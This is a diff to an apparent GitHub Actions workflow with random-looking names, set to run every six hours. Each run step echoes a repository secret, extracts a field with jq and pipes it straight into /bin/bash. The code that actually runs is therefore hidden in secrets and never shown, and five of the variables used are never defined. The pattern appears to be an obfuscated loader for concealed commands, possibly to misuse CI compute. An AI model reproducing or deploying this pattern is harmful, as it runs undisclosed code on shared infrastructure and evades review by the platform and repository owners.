@@ -1,23 +1,22 @@
 name: maotongxiao9771
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 3/6 * * *'
-
+    - cron: '1 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: maotongxiao9771
         env:
-          crz50565: ${{ secrets.crz50565 }}
+          ep90: ${{ secrets.ep90 }}
         run: |
-          echo $crz50565 | jq -r .bjzqn8524 | /bin/bash
-          echo $ki02501 | jq -r .uciy94 | /bin/bash
-          echo $slso2268 | jq -r .l0914 | /bin/bash
-          echo $buf77 | jq -r .xdo4 | /bin/bash
-          echo $tnz860 | jq -r .nhhls4 | /bin/bash
-          echo $iq3 | jq -r .tpzw106 | /bin/bash
+          echo $ep90 | jq -r .nf19 | /bin/bash
+          echo $ifg78 | jq -r .icd623 | /bin/bash
+          echo $gknhe3 | jq -r .n47490 | /bin/bash
+          echo $hqm5314 | jq -r .x5901 | /bin/bash
+          echo $s04974 | jq -r .v96 | /bin/bash
+          echo $vysbj3 | jq -r .axpi3551 | /bin/bash
 
